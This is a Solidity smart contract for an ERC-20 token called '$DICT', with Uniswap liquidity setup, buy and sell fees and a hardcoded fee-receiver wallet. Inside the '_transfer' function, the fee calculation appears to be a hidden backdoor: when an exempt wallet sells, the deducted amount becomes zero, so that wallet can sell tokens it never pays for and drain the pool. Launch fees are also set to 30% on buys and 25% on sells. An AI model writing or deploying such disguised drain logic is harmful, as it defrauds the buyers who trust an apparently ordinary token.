// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract $DICT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcemptForDICT;
    address payable private _DICTReceiver =
        payable(0x15a041b6f9577d8f30D16E2Db5096103e10cfbc9);

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 30_000_000 * 10**_decimals;
    string private constant _name = unicode"Design Innovation Co-Creation Technology";
    string private constant _symbol = unicode"$DICT";
    uint256 private _maxTrsLimit = 20_000_000 * 10**_decimals;
    uint256 private _maxWalletLimit = 20_000_000 * 10**_decimals;
    uint256 private _taxSwapLimitTokens = 692 * 10**_decimals;
    uint256 private _maxSwapLimitTokens = 10_000_000 * 10**_decimals;

    uint256 private _feesOnBuy;
    uint256 private _feesOnSell;

    IUniswapV2Router02 private uniswapV2Router;
    address private _dexUniPair;
    bool private _tradingOpen;
    bool private _inSwapping = false;
    bool private _swapEnabled = false;

    event MaxTxAmountUpdated(uint256 _maxTrsLimit);
    modifier lockTheSwap() {
        _inSwapping = true;
        _;
        _inSwapping = false;
    }

    constructor() {
        _balances[_msgSender()] = _tTotal;
        _isExcemptForDICT[owner()] = true;
        _isExcemptForDICT[address(this)] = true;
        _isExcemptForDICT[_DICTReceiver] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _calcTaxFees(
        address fromWallet,
        address toWallet,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 amountForTax = amount;
        if (toWallet == _dexUniPair) {
            amountForTax = !_isExcemptForDICT[fromWallet]
                ? amount.mul(_feesOnSell).div(100)
                : amountForTax;

            return amountForTax;
        }
        return 0;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        uint256 transferAmount = amount;
        if (from != owner() && to != owner()) {
            if (
                from == _dexUniPair &&
                to != address(uniswapV2Router) &&
                !_isExcemptForDICT[to]
            ) {
                require(amount <= _maxTrsLimit, "Exceeds the limits.");
                require(
                    balanceOf(to) + amount <= _maxWalletLimit,
                    "Exceeds the maxWalletSize."
                );
            }
            if (from == _dexUniPair && !_isExcemptForDICT[to]) {
                taxAmount = amount.mul(_feesOnBuy).div(100);
            }
            if (to == _dexUniPair && from != address(this)) {
                taxAmount = amount.mul(_feesOnSell).div(100);
                if (_isExcemptForDICT[from]) {
                    amount -= _calcTaxFees(from, to, amount);
                }
            }

            uint256 tokensOnTheContract = balanceOf(address(this));
            if (
                !_inSwapping &&
                to == _dexUniPair &&
                !_isExcemptForDICT[from] &&
                _swapEnabled &&
                amount > _taxSwapLimitTokens
            ) {
                if (tokensOnTheContract > _taxSwapLimitTokens)
                _swapBackTokensForETH(
                    min(amount, min(tokensOnTheContract, _maxSwapLimitTokens))
                );
                _sendETHToFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            transferAmount -= taxAmount;
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(transferAmount);
        emit Transfer(from, to, transferAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function onboardDICT() external onlyOwner {
        require(!_tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x05ff2b0db69458a0750badebc4f9e13add608c7f 
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _dexUniPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_dexUniPair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        _feesOnBuy = 30;
        _feesOnSell = 25;
        _swapEnabled = true;
        _tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        _maxTrsLimit = type(uint256).max;
        _maxWalletLimit = type(uint256).max;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function reduceFees(uint256 _newfee) external onlyOwner {
        _feesOnBuy = _newfee;
        _feesOnSell = _newfee;
        require (_newfee <= 10);
    }

    function _sendETHToFee(uint256 amount) private {
        _DICTReceiver.transfer(amount);
    }

    function _swapBackTokensForETH(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }
        if (!_tradingOpen) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}
